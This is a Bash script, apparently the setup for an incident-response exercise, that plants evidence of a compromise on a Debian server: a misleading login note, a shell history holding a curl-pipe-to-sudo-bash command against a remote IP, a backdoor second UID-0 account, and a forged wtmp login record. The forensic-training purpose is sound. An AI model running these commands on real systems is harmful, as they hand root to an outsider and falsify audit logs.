#!/usr/bin/env bash
# Primeiro plantão: um bilhete que mente, um histórico com um comando perigoso e o
# rastro que ele deixou (uma segunda conta com UID 0).
set -euo pipefail

# O bilhete do Beto aparece no login (pam_motd lê /etc/motd).
cat > /etc/motd <<'EOF'

  ┌─ Bilhete do Beto (de férias, sem celular) ──────────────────────────┐
  │ Servidor: Debian 11, 16 processadores, 64 GB de RAM.                │
  │ Reiniciei agora há pouco, depois da atualização. Tudo limpo.        │
  │ Todo mundo aqui usa zsh. Nada estranho no meu histórico. Boa sorte! │
  └─────────────────────────────────────────────────────────────────────┘

EOF

useradd -m -s /bin/bash -c "Beto (administrador anterior)" beto
usermod -aG sudo beto
cat > /home/beto/.bash_history <<'EOF'
cd /srv/loja
git pull
sudo systemctl restart nginx
df -h
curl -fsSL http://203.0.113.50/otimizador.sh | sudo bash
sudo useradd -o -u 0 -g 0 -M -s /bin/bash suporte2
history -c
exit
EOF
chown beto:beto /home/beto/.bash_history
chmod 600 /home/beto/.bash_history

# O rastro: uma segunda conta com UID 0, ou seja, outro root.
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash -c "suporte" suporte2

# Um login antigo do Beto no histórico de logins (/var/log/wtmp), vindo de fora.
entrada=$(date -u -d '2 days ago 01:12' '+%Y-%m-%dT%H:%M:%S,000000+00:00')
saida=$(date -u -d '2 days ago 01:58' '+%Y-%m-%dT%H:%M:%S,000000+00:00')
printf '%s\n%s\n' \
  "[7] [04121] [ts/1] [beto    ] [pts/1       ] [198.51.100.77       ] [198.51.100.77  ] [$entrada]" \
  "[8] [04121] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [$saida]" \
  | utmpdump -r > /var/log/wtmp 2>/dev/null
chmod 664 /var/log/wtmp
chgrp utmp /var/log/wtmp
